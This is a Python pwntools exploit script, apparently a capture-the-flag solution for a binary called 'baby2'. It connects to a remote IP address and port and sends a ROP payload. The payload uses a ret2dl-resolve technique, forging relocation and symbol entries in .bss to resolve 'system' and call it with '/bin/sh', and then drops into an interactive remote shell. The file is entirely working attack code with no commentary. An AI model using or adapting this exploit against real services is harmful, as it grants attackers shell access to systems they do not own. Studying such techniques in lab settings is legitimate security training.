#!/usr/bin/env python
# coding=utf-8
from pwn import *
#a=process("./baby2")
a=remote("51.254.114.246","2222")
#gdb.attach(a,"b *0x80484a3")
elf=ELF("./baby2")
read_plt=elf.plt["read"]
rel_plt_addr=0x80482d8
dynsym_addr=0x80481d0
dynstr_addr=0x8048240
plt0_addr=0x8048320
pop3_ret=0x08048509
bss_addr=elf.bss()+0x20

fake_rel_plt_addr=bss_addr

arg_offset=fake_rel_plt_addr - rel_plt_addr#dl_reslove(linkmap,arg_offset)

fake_dynsym_addr=fake_rel_plt_addr + 0x8   #fake_dynsym address

align=16-(fake_dynsym_addr-dynsym_addr)%16  #align
fake_dynsym_addr+=align                 

r_info=(((fake_dynsym_addr-dynsym_addr)/16)<<8)|0x7 #rel_plt's r_info

fake_dynstr_addr=fake_dynsym_addr+16   
sh_addr=fake_dynstr_addr + 7
offset=fake_dynstr_addr-dynstr_addr

payload=""
payload+=p32(read_plt) #read
payload+=p32(pop3_ret) #pop pop pop ret
payload+=p32(0)        #fd
payload+=p32(bss_addr) #buf
payload+=p32(0x100)    #length
payload+=p32(plt0_addr)#PLT[0]
payload+=p32(arg_offset)
payload+=p32(pop3_ret) #return address
payload+=p32(sh_addr)#/bin/sh address
payload=payload.ljust((0x30-4),"\x00")
payload+='\x9c'
a.send(payload)

pause()

payload=p32(elf.got["read"])#fake_rel_plt
payload+=p32(r_info)
payload+='A'*align     #padding
payload+=p32(offset)+p32(0)+p32(0)+p32(0x12) #fake dynsym
payload+="system\x00" #fake dynstr
payload+="/bin/sh\x00"
a.sendline(payload)
a.interactive()
